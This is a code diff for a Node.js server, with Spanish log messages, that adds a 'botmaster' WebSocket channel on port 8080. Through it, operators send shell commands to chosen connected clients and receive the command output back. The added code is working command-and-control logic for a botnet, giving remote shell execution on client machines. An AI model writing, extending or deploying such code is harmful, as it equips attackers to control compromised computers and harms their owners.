@@ -6,6 +6,7 @@ const { setup } = require ('./setup.js')
 
 const port = 3000;
 let clients = {};
+let botmasters = {};
 
 
 const server = http.createServer((req, res) => {
@@ -49,6 +50,37 @@ const server = http.createServer((req, res) => {
     }
 });
 
+const wss_shell = new WebSocket.Server({ port: 8080 });
+
+wss_shell.on('connection', (ws, req) => {
+  console.log('Nuevo botmaster conectado');
+  const ip = req.connection.remoteAddress;
+  botmasters[ip] = ws;
+  ws.on('message', message => {
+    console.log(`Recibido: ${message}`);
+    const result = JSON.parse(message);
+    console.log(Object.keys(clients))
+
+    if (result.objective in clients){
+        const command = {
+            id: result.id,
+            sh_cmd: result.sh_cmd,
+            botmaster: ip,
+            command: 'Shell'
+
+        }
+        clients[result.objective].send(JSON.stringify(command))
+    } else {
+        ws.send(JSON.stringify({error: 'Objective does not exist'}));
+    }
+  });
+  ws.on('close', () => {
+      console.log("Botmaster desconectado")
+      delete botmasters[ip];
+    });
+});
+
+
 const wss = new WebSocket.Server({ server });
 
 wss.on('connection', (ws, req) => {
@@ -71,6 +103,8 @@ wss.on('connection', (ws, req) => {
                     break;
 
                 case "Shell":
+                    console.log('Received shell result from client: ', ip)
+                    botmasters[result.botmaster].send(JSON.stringify(result.result))
                     break;
 
                 default:
